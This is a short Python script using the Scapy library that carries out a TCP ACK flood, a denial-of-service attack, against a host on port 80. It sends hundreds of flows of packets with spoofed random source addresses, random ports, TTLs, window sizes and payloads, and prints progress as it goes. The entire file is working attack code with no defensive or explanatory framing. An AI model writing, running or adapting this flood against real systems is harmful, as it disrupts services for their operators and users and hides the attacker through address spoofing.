from scapy.all import *
import random
import time

TARGET_IP = "192.168.1.1"
TARGET_PORT = 80
FLOWS = 500
MIN_PACKETS = 5
MAX_PACKETS = 30

print(f"[*] Starting ACK Flood -> {TARGET_IP}:{TARGET_PORT}")
print(f"[*] Sending {FLOWS} flows x {MIN_PACKETS}-{MAX_PACKETS} packets")

for f in range(FLOWS):
    src_ip = f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
    sport  = random.randint(1024, 65535)
    ttl    = random.randint(32, 128)
    window = random.choice([1024, 2048, 4096, 8192, 16384, 65535])

    packets = random.randint(MIN_PACKETS, MAX_PACKETS)
    for p in range(packets):
        payload_size = random.randint(10, 100)
        payload = bytes([random.randint(0, 255) for _ in range(payload_size)])

        pkt = IP(
            src=src_ip,
            dst=TARGET_IP,
            ttl=ttl,
            id=random.randint(1, 65535)
        ) / TCP(
            sport=sport,
            dport=TARGET_PORT,
            flags="A",
            seq=random.randint(0, 2**32 - 1),
            ack=random.randint(0, 2**32 - 1),
            window=window
        ) / Raw(load=payload)

        send(pkt, verbose=0)
        time.sleep(random.uniform(0.001, 0.01))

    time.sleep(random.uniform(0.01, 0.05))

    if (f + 1) % 20 == 0:
        print(f"[+] {f + 1}/{FLOWS} flows sent")

print("[*] Done.")